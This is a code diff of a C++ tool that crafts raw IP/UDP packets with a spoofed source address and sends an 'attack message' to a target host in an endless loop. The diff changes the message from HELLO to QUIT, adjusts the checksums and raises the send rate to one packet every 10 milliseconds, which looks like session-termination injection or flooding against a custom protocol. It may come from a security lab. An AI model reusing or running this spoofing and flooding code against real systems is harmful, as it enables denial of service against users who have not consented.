@@ -42,6 +42,7 @@
     
 using namespace std;
 
+
 /**
  * Interrupt handler
  */
@@ -196,8 +197,9 @@ int main (int argc, const char * argv[]){
     // Add SIGINT handler
     signal(SIGINT, signalHandler);
     
-    
+    // Allocate headers from memory
 	char packet[2000];
+    memset(packet, 0, 2000);
     struct ip* ip = (struct ip *)packet;
 	struct udphdr* udp= (struct udphdr*)(packet + sizeof(struct ip));
 	int sd;
@@ -206,13 +208,13 @@ int main (int argc, const char * argv[]){
     
     // Create attack message
     Message msg;
-    msg.init(version, TYPE_HELLO);
+    msg.init(version, TYPE_QUIT);
     msg.setSeqnum(seqnum);
     //msg.printBytes();
     
     msg.parseToBytes(packet + sizeof(struct ip) + sizeof(struct udphdr));
     int pktLen = HEADER_SIZE + msg.getPayloadLength();
-
+    
     // Total length
     // IP header + UDP header + payload
     int totLen = sizeof(struct ip) + sizeof(struct udphdr) + pktLen;
@@ -229,7 +231,7 @@ int main (int argc, const char * argv[]){
 	ip->ip_sum = 0x0;
 	ip->ip_src.s_addr = inet_addr(source.c_str());
 	ip->ip_dst.s_addr = inet_addr(target.c_str());
-	ip->ip_sum = in_cksum((unsigned short *)packet, totLen);
+	ip->ip_sum = in_cksum((unsigned short *)packet, sizeof(struct ip));
     
     // Set UDP ports
     udp->uh_sport = htons(atoi(clientPort.c_str()));
@@ -239,37 +241,38 @@ int main (int argc, const char * argv[]){
     
     // UDP datagram length
     udp->uh_ulen = htons(sizeof(struct udphdr) + pktLen); // UDP header + data, data still missing
+    cout << "UDP len: " << ntohs(udp->uh_ulen) << endl;
     //udp.len = htons(8); // UDP header + data, data still missing
-
+    
     // Calculate checksum
-    udp->uh_sum = 0;
+    udp->uh_sum = htons(ntohs(0x3251));
     //udp.check = 0;
-	udp->uh_sum = in_cksum_udp(ip->ip_src.s_addr, ip->ip_dst.s_addr, (unsigned short *)udp, sizeof(&udp));
-
+	//udp->uh_sum = in_cksum_udp(ip->ip_src.s_addr, ip->ip_dst.s_addr, (unsigned short *)udp, sizeof(struct udphdr));
+    printf("CRC: %X", udp->uh_sum);
+    
     // Create raw UDP socket
     if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
 		perror("raw socket");
 		exit(1);
 	}
-
+    
     // Socket options
 	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
 		perror("setsockopt");
 		exit(1);
 	}
-
     
 	memset(&sin, 0, sizeof(sin));
 	sin.sin_family = AF_INET;
 	sin.sin_addr.s_addr = ip->ip_dst.s_addr;
-        
+    
     while (true) {
         cout << "." << flush;
         if (sendto(sd, packet, totLen, 0, (struct sockaddr *)&sin, sizeof(struct sockaddr)) < 0)  {
             perror("sendto");
             exit(1);
         }
-        sleep(1);
+        usleep(10000);
     }
 
 	return 0;
